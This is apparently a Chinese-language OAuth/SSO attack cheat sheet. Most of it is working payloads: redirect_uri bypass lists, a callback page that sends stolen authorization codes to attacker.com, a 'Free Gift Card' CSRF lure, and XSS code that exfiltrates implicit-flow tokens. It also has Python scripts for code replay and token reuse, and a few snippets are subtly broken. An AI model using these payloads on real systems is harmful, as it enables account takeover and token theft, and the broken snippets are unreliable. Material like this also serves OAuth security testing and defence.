# OAuth/SSO 攻击向量详解

## Table of Contents
- [redirect_uri 完整 Payload 列表](#redirect_uri-完整-payload-列表)
  - [站内 Open Redirect 配合](#站内-open-redirect-配合)
  - [绕过路径校验变体](#绕过路径校验变体)
  - [绕过域名校验变体](#绕过域名校验变体)
- [state 参数缺失 CSRF 攻击](#state-参数缺失-csrf-攻击)
  - [完整 PoC 代码](#完整-poc-代码)
  - [POST 形式 callback](#post-形式-callback)
- [Token 泄露途径](#token-泄露途径)
  - [Referer 泄露](#referer-泄露)
  - [DNS 泄露](#dns-泄露)
  - [日志泄露](#日志泄露)
  - [Implicit Flow 特殊风险](#implicit-flow-特殊风险)
- [Token 替换/Replay 攻击](#token-替换replay-攻击)
- [OpenID Connect 专项攻击](#openid-connect-专项攻击)
- [Scope 提升攻击](#scope-提升攻击)
- [client_secret 泄露利用](#client_secret-泄露利用)
- [账户接管完整场景](#账户接管完整场景)

---

## redirect_uri 完整 Payload 列表

### 绕过路径校验变体

| bypass 类型 | payload | 说明 |
|------------|---------|------|
| 路径遍历 | `https://target.com/callback/../evil` | 绕过只校验前缀的情况 |
| 双路径遍历 | `https://target.com/callback/../../internal/admin` | 到达内网路径 |
| 斜杠差异 | `https://target.com/callback//evil.com` | 双重斜杠被规范化 |
| 空字节 | `https://target.com/callback%00.evil.com` | URL 截断（老旧服务器） |
| 大小写 | `https://target.COM/callback` | DNS 不区分大小写绕过校验 |
| 端口操纵 | `https://target.com:443@evil.com` | 携带目标域名认证信息 |
| 子域名覆盖 | `https://eviltarget.com` | 校验仅检查包含 target 字符串 |
| 特殊编码 | `https://target%E2%80%8B.com` | 零宽空格插入 |
| 同形异义词 | `https://tаrget.com` ( Cyrillic 'a') | Unicode 同形异义攻击 |
| IP 进制 | `https://3232276995/` (target.com) | 十进制 IP 绕过域名校验 |
| IPv6 | `https://[::ffff:192.168.1.1]/` | IPv6 映射地址 |

### 绕过域名校验变体

```
# 完整子域名接管
redirect_uri=https://oauth.target.com

# 域名前缀匹配绕过
redirect_uri=https://target.com.evil.com/callback

# 路径校验绕过（只校验路径部分）
redirect_uri=https://evil.target.com/.target.com/callback

# URL 解析差异
redirect_uri=https://target.com@evil.com
redirect_uri=https://target.com:80@evil.com
redirect_uri=https://target.com.evil.com

# 空白字符（Tab/换行）
redirect_uri=https://target.com%09callback
redirect_uri=https://target.com%0A%0Dcallback

# 利用 URL 解析器差异
redirect_uri=https://target.com/./callback  → /callback 规范化后
redirect_uri=https://target.com/callback/.  → 末尾点被忽略
```

### 站内 Open Redirect 配合

如果 redirect_uri 严格校验域名但不校验路径，可利用目标站内的 Open Redirect：

```bash
# Step 1: 找目标站内的 Open Redirect 端点
# 常见端点：
/redirect?url=https://evil.com
/代理人?url=https://evil.com
/out?url=https://evil.com
/link?goto=https://evil.com
/SSO?RelayState=https://evil.com
/go?target=https://evil.com

# Step 2: 组合 redirect_uri
redirect_uri=https://target.com/redirect?url=https://evil.com/steal
# 服务端验证了 target.com 域名，但授权码被重定向到 evil.com
```

### 完整 PoC 页面

```html
<!DOCTYPE html>
<html>
<head <title>Login</title>
<body>
<h1>Please wait, logging in...</h1>
<script>
const params = new URLSearchParams(window.location.search);
const code = params.get('code');
if (code) {
    // 发送到攻击者服务器
    fetch('https://attacker.com/steal?code=' + code + '&state=' + params.get('state'));
}
</script>
</body>
</html>
```

---

## state 参数缺失 CSRF 攻击

### 原理

state 参数绑定用户会话和 OAuth 流程，防止 CSRF。没有 state：
1. 攻击者获取自己的 authorization_code
2. 诱使受害者用攻击者的 code 完成认证
3. 受害者账户绑定到攻击者的 OAuth 账户
4. 攻击者登录自己账户 → 自动进入受害者会话

### 完整 PoC 代码

```html
<!DOCTYPE html>
<html>
<head>
<title>Free Gift Card</title>
</head>
<body>
<h1>You won! Click below to claim your gift card</h1>

<!-- 攻击者 OAuth 入口 -->
<a href="https://target.com/oauth/authorize?
    client_id=ATTACKER_APP&
    redirect_uri=https://attacker.com/collect?
    response_type=code&
    scope=profile%20email&
    state=_attack_id_">

    <img src="gift_card.png" alt="Claim Now">
</a>

<script>
    // 如果已经点进来，5秒后自动跳转
    setTimeout(() => {
        window.location.href = 'https://target.com/oauth/authorize?' +
            'client_id=ATTACKER_APP&' +
            'redirect_uri=https://attacker.com/collect&' +
            'response_type=code&' +
            'scope=profile%20email';
    }, 5000);
</script>
</body>
</html>
```

### POST 形式 callback

有些 OAuth 实现使用 POST callback（不是重定向）：

```html
<form id="csrf" action="https://target.com/oauth/token" method="POST">
    <input type="hidden" name="grant_type" value="authorization_code" />
    <input type="hidden" name="code" value="ATTACKER_CODE" />
    <input type="hidden" name="redirect_uri" value="https://attacker.com/collect" />
    <input type="hidden" name="client_id" value="ATTACKER_APP" />
</form>
<script>
    document.getElementById('csrf').submit();
</script>
```

---

## Token 泄露途径

### Referer 泄露

回调页面如果包含外部资源（图片、JS、CSS）：

```html
<!-- 恶意页面 -->
<img src="https://target.com/logo.png">
<!-- Referer = 包含 token 的完整 URL -->
```

PoC：
```html
<!DOCTYPE html>
<html>
<head>
    <!-- 通过Referer泄露code -->
    <img src="https://target.com/callback?code=STEAL_CODE" style="display:none">
</head>
<body>
<h1>Page Not Found</h1>
</body>
</html>
```

更隐蔽：使用 CSS 背景图
```html
<div style="background: url('https://attacker.com/log?ref=' + document.referrer)">
```

### DNS 泄露

将 code 通过 DNS 查询发送到攻击者 DNS 服务器：

```bash
# 攻击者监听 DNS
sudo tcpdump -i eth0 -n port 53 | grep target.com

# 受害者被诱导访问构造的 URL 后
# code 在 DNS 查询的子域名中
# attacker.com. 300 IN A 1.2.3.4
# _code.abc123.target.com. 300 IN CNAME attacker.com
```

### 日志泄露

code 在 URL query 中会被记录在多处：
- 浏览器历史记录
- 服务器 access_log
- 中间人设备（代理、CDN）
- Referer 头（访问外部链接时）

```python
# 利用日志分析寻找他人的 authorization_code
# 在 HTTP 代理/ Burp Suite 中被动扫描
```

### Implicit Flow 特殊风险

`response_type=token` 时，access_token 直接在 URL fragment 中：

```
https://callback#access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
&token_type=Bearer
&expires_in=3600
&state=xyz
```

攻击方式：
1. URL fragment 不会发送到服务器（保留在浏览器端）
2. 但通过 `window.location` 可被 JS 读取
3. 如果页面有 XSS，直接读取 fragment 并外带

```javascript
// XSS + Implicit Flow Token 窃取
var token = window.location.hash.split('&')[0].split('=')[1];
fetch('https://attacker.com/steal?token=' + token);
```

---

## Token 替换/Replay 攻击

### Authorization Code Replay

某些服务端不验证 code 是否已使用（一次性）：

```python
import requests
import time

code = 'AUTHORIZATION_CODE'

# 第一次使用
r1 = requests.post('https://target.com/oauth/token',
    json={'code': code, 'grant_type': 'authorization_code'})
print(f"[+] First use: {r1.json()}")

time.sleep(1)

# 第二次使用（如果服务端未验证唯一性）
r2 = requests.post('https://target.com/oauth/token',
    json={'code': code, 'grant_type': 'authorization_code'})
print(f"[+] Second use: {r2.json()}")
```

### Token Rotation 不完整

某些实现会在 refresh_token 时颁发新 access_token，但未撤销旧 token：

```python
# 用 refresh_token 获取新 access_token
r = requests.post('https://target.com/oauth/token', json={
    'grant_type': 'refresh_token',
    'refresh_token': OLD_REFRESH_TOKEN
})
new_access = r.json()['access_token']

# 旧 access_token 仍然有效（如果服务端未撤销）
r2 = requests.get('https://target.com/api/user',
    headers={'Authorization': f'Bearer {OLD_ACCESS_TOKEN}'})
```

---

## OpenID Connect 专项攻击

### Nonce 缺失（与 state 类似）

OpenID Connect 的 `nonce` 参数防止 token 重放。如果缺失：
- 攻击者可用截获的 id_token 进行重放攻击

### 分离 Token 窃取

OIDC 有三种 token：
- **access_token**：调用 API
- **id_token**：身份信息（JWT 格式）
- **refresh_token**：获取新 token

```python
import jwt

# id_token 是 JWT，可直接解码获取用户信息
id_token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...'
# 不验证签名即可读取 claims
payload = jwt.decode(id_token, options={'verify_signature': False})
print(payload)
# {'sub': '12345', 'email': 'victim@target.com', 'aud': 'client_id', ...}
```

### 攻击流程（无 state/nonce）

```python
# 1. 攻击者正常完成 OAuth，获取 code（自己的）
# 2. 截获受害者的 code（通过上述任意方式）
# 3. 攻击者用自己的 client_id + 受害者的 code 换取 token
# 4. 受害者的 token 被攻击者使用
```

---

## Scope 提升攻击

### 动态 Scope 枚举

逐步提升 scope，观察服务端响应：

```
scope=openid
scope=openid profile
scope=openid profile email
scope=openid profile email admin
```

### scope 注入

某些服务端直接拼接 scope：
```python
# 恶意请求
scope=openid profile email", "admin
# 拼接后：'openid profile email", "admin' → 可能获得 admin 权限
```

---

## client_secret 泄露利用

### 常见泄露位置

```
# JavaScript 源码
fetch('/api/oauth/token', {
    body: JSON.stringify({client_secret: '...'})
})

# GitHub 搜索
client_secret in:code language:javascript repo:target/app

# Swagger/OpenAPI 文档
/components/securitySchemes/oauth2:
  client_secret: "xxx"
```

### 有 client_secret 后

```python
import requests

# 直接用 code 换 token（无需浏览器交互）
r = requests.post('https://target.com/oauth/token', json={
    'grant_type': 'authorization_code',
    'code': '截获的CODE',
    'redirect_uri': 'https://target.com/callback',
    'client_id': 'ATTACKER_CLIENT_ID',
    'client_secret': '泄露的SECRET'
})
token = r.json()['access_token']
print(f"Access Token: {token}")
```

---

## 账户接管完整场景

### 场景 1：邮箱预关联（Pre-account Takeover）

```python
# 攻击流程：
# 1. 攻击者注册 attacker@target.com
# 2. 目标平台使用不验证邮箱的 OAuth Provider（如 Google）
# 3. 攻击者在 OAuth Provider 修改邮箱为 victim@target.com
# 4. 受害者首次用 Google 登录 target.com
# 5. 系统发现 attacker@target.com 已存在，匹配到同一邮箱
# 6. 攻击者账户获得受害者权限
```

### 场景 2：Token 替换

```python
# 1. 受害者已登录 target.com，持有 access_token
# 2. 攻击者通过 XSS/CSRF 获取受害者的 access_token
# 3. 攻击者在自己浏览器中注入受害者的 token
# 4. 后续请求以受害者身份发出
```

### 场景 3：OAuth 链接完整性

```html
<!-- 恶意页面模拟 OAuth 登录 -->
<form action="https://target.com/oauth/authorize" method="POST">
    <input type="hidden" name="client_id" value="EVIL_CLIENT" />
    <input type="hidden" name="redirect_uri" value="https://attacker.com/steal" />
    <input type="hidden" name="response_type" value="code" />
    <input type="hidden" name="state" value="attacker_session" />
</form>
```

---

## 注意事项

- **redirect_uri 绕过** 是最常见的 OAuth 漏洞，需系统测试所有变体
- **state 和 nonce 必须同时存在** 才算完整防护
- **Implicit Flow 风险最高** — 如果必须使用，token 应尽可能短的生命周期
- **Token 存储** — 前端存储 token 时务必防 XSS
